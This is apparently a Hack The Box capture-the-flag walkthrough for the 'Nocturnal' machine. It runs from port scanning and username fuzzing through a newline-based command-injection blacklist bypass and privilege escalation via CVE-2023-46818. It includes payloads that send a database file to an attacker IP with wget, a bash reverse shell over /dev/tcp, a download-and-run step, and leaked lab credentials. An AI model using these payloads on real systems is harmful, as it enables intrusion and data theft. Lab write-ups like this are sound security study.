# Nocturnal

Start with **Nmap** to identify open ports and services:
```sh
nmap -p- -T4 10.10.11.64
nmap -sV -sC -p 22,80 10.10.11.64
echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
nikto -h http://nocturnal.htb
gobuster dir -u http://nocturnal.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

We can register on the website and reach dashboard.php which allows file uploads.  
File upload restrictions:
```
Invalid file type." PDF, doc, docx, xls, xlsx, and odt are allowed
```

IDOR / Fuzzing: Fuzz usernames to find valid accounts:
```sh
http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf
ffuf -u "http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf" -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -b "PHPSESSID=erbpv8q9e6n8p65j7dk8lsgpde" -fr "User not found"
```

Found Amanda user and downloaded her files → found password:
```
arHkG7HAI68X8s1J
```

Use the password to access the admin panel.  
Test injection payloads with Burp Suite:
```sh
password=1%0awhoami>text.txt%0a&backup=
# Discovered the nocturnal_database.db file
password=''>/dev/null%0als%09/var/www/nocturnal_database&backup=
```

Admin.php sanitization function:
```php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];
...
```

After some search we find nocturnal_database.db:
```sh
password=''>/dev/null%0awget%09-X%09POST%09http://10.10.14.124:8000/upload%09-F%09'files=@/var/www/nocturnal_database/nocturnal_database.db'#&backup=

# or we can echo "bash -c 'bash -i >& /dev/tcp/10.10.14.124/4444 0>&1'" > shell
# password=test%0acurl%09http://10.10.14.124/shell%09-o%09/tmp/shell&backup=
# password=test%0abash%09/tmp/shell&backup=
```



Extracted hashes from the database:
```sh
sqlite3 nocturnal_database.db
.tables
select * from users;
echo -n "tobias:55c82b1ccd55ab219b3b109b07d5061d" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# slowmotionapocalypse
```


SSH into the machine with tobias:
```sh
id
whoami
groups
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
python3 -m http.server 8000
curl http://10.10.14.116:8000/linpeas.sh -o linpeas.sh
```

Found service running on port 8080:
```sh
ss -tulpn
```

Tunneling via SSH to access ISPConfig:
```sh
ssh -L 8080:127.0.0.1:8080 tobias@nocturnal.htb
http://localhost:8080/
```

Discovered version: ISPConfig 3.2.10p1  
Found CVE-2023-46818 and exploited:
```sh
https://github.com/ajdumanhug/CVE-2023-46818
tobias@nocturnal:~$ python3 script.py http://localhost:8080 admin slowmotionapocalypse
```